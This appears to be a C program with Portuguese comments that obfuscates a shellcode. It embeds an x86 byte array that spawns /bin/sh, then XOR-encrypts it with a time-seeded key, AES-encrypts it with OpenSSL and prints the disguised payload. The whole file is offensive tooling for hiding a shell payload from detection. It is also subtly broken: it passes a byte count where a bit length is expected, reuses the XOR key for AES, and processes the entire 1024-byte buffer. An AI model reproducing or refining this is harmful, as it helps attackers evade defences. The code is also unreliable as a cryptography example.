#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <openssl/aes.h>

// Definição tamanho da chave para a criptografia 
#define AES_KEY_SIZE 128

// Tamanho máximo do shellcode a ser ofuscado
#define MAX_SHELLCODE_SIZE 1024

// Função para gerar uma chave aleatória para a criptografia XOR
void generateXORKey(unsigned char* key, int keySize) {
    srand(time(NULL));
    for (int i = 0; i < keySize; i++) {
        key[i] = rand() % 256;
    }
}

//  Função para realizar a criptografia XOR no shellcode
void encryptXOR(unsigned char* shellcode, int shellcodeSize, unsigned char* key, int keySize) {
    for (int i = 0; i < shellcodeSize; i++) {
        shellcode[i] ^= key[i % keySize];
    }
}

// Função para criptografar o shellcode usando a criptografia AES
void encryptAES(unsigned char* shellcode, int shellcodeSize, unsigned char* key, int keySize) {
    AES_KEY aesKey;
    AES_set_encrypt_key(key, keySize, &aesKey);
    for (int i = 0; i < shellcodeSize; i += AES_BLOCK_SIZE) {
        AES_encrypt(shellcode + i, shellcode + i, &aesKey);
    }
}

// Função principal
int main() {
    // ALteração de shellcode 
    unsigned char originalShellcode[MAX_SHELLCODE_SIZE] = { 0x4d, 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73,
                                                          0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
                                                          0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1, 0xb0, 0x0b,
                                                          0xcd, 0x80 };
    int shellcodeSize = sizeof(originalShellcode);

    // Função responsavel por gerar a chave aleatória para a criptografia XOR
    unsigned char xorKey[AES_KEY_SIZE / 8];
    generateXORKey(xorKey, AES_KEY_SIZE / 8);

    encryptXOR(originalShellcode, shellcodeSize, xorKey, AES_KEY_SIZE / 8);

    // Criptografando o shellcode 
    encryptAES(originalShellcode, shellcodeSize, xorKey, AES_KEY_SIZE / 8);

   
    printf("Shellcode Ofuscado:\n");
    for (int i = 0; i < shellcodeSize; i++) {
        printf("\\x%.2x", originalShellcode[i]);
    }
    printf("\n");

    return 0;
}

